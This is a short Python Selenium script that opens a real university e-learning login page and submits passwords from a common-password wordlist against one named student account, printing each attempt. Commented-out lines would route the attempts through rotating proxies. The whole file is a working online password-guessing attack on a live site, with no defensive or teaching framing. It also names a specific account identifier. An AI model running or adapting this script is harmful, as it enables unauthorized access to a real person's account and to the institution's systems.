import time

from selenium import webdriver

'''from http_request_randomizer.requests.proxy.requestProxy import RequestProxy
req_proxy = RequestProxy() #you may get different number of proxy when  you run this at each time
proxies = req_proxy.get_proxy_list() #this will create proxy list'''

'''options = Options()
options.add_argument('--proxy-server=46.102.106.37:13228')
browser = webdriver.Chrome(executable_path='ChromeDriverPath', chrome_options=options)'''


driver = webdriver.Chrome(executable_path="C:\\Users\\omarh\\Downloads\\Compressed\\chromedriver_win32_2\\chromedriver.exe")  # Optional argument, if not specified will search path.

driver.get('https://elearning.zuj.edu.jo/')

time.sleep(5) # Let the user actually see something!

#search_box = driver.find_element_by_name('q')
#search_box.send_keys('ChromeDriver')
    #search_box.submit()
counter = 0
#with open('D:\\backup\\python projects\\python try hack insta\\rockyou.txt', errors="ignore") as f:  ###### nan04/25/01 ######
# with open('C:\\Users\\omarh\\Desktop\\pass.txt', errors="ignore") as f:
with open('D:\\backup\\python projects\\Hack\\10k most common.txt', errors="ignore") as f:
    for line in f:
        inputElement = driver.find_element_by_id("username")
        inputElement.send_keys('201911176@std-zuj.edu.jo')

        inputElement = driver.find_element_by_id("password")
        inputElement.send_keys(line.strip())

        inputElement.submit()
    # username
    # password
        counter = counter+1
        print(f"Try: {counter} , {line.strip()}")
        time.sleep(0.05) # Let the user actually see something!

#driver.quit()
